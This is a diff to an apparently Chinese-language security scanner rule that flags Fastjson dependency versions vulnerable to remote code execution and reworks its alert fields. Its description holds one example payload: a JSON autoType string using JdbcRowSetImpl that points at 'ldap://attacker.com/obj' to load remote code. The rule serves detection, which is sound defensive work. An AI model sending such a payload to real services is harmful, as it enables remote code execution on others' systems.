@@ -18,7 +18,7 @@ desc(
    ```java
    import com.alibaba.fastjson.JSON;
    // ...
-   String jsonString = "{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.com/obj","autoCommit":true}";
+   String jsonString = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/obj\",\"autoCommit\":true}";
    Object obj = JSON.parse(jsonString); // 存在漏洞时，可能触发 LDAP 连接并加载执行远程代码
    ```
 
@@ -89,22 +89,46 @@ REFERENCE
 __dependency__.*alibaba*fastjson.version as $ver;
 $ver in (,1.2.47] as $vuln_1_2_47;
 alert $vuln_1_2_47 for {
-    message: 'SCA: com.alibaba.fastjson <= 1.2.47 RCE Easy to exploit',
-    severity: critical,
-    cvss: "9.8"
+	cvss: "9.8",
+	title: "SCA: Check Java Fastjson Vulnerabilities",
+	title_zh: "SCA: 检测Java Fastjson依赖漏洞",
+	solution: <<<CODE
+
+CODE
+	desc: <<<CODE
+
+CODE
+	level: "high",
+	message: "SCA: com.alibaba.fastjson <= 1.2.47 RCE Easy to exploit",
+	severity: "critical",
 }
 
 $ver in (,1.2.68] as $vuln_1_2_68;
 alert $vuln_1_2_68 for {
-    message: 'SCA: com.alibaba.fastjson <= 1.2.68 RCE Mid to exploit',
-    level: high,
+	title: "SCA: Check Java Fastjson Vulnerabilities",
+	title_zh: "SCA: 检测Java Fastjson依赖漏洞",
+	solution: <<<CODE
 
+CODE
+	desc: <<<CODE
+
+CODE
+	level: "high",
+	message: "SCA: com.alibaba.fastjson <= 1.2.68 RCE Mid to exploit",
 }
 
 $ver in (,1.2.83) as $vuln_1_2_80;
 alert $vuln_1_2_80 for {
-    message: 'SCA: com.alibaba.fastjson < 1.2.83 RCE Hard to exploit',
-    level: mid,
+	title: "SCA: Check Java Fastjson Vulnerabilities",
+	title_zh: "SCA: 检测Java Fastjson依赖漏洞",
+	solution: <<<CODE
+
+CODE
+	desc: <<<CODE
+
+CODE
+	level: "mid",
+	message: "SCA: com.alibaba.fastjson < 1.2.83 RCE Hard to exploit",
 }
 
 
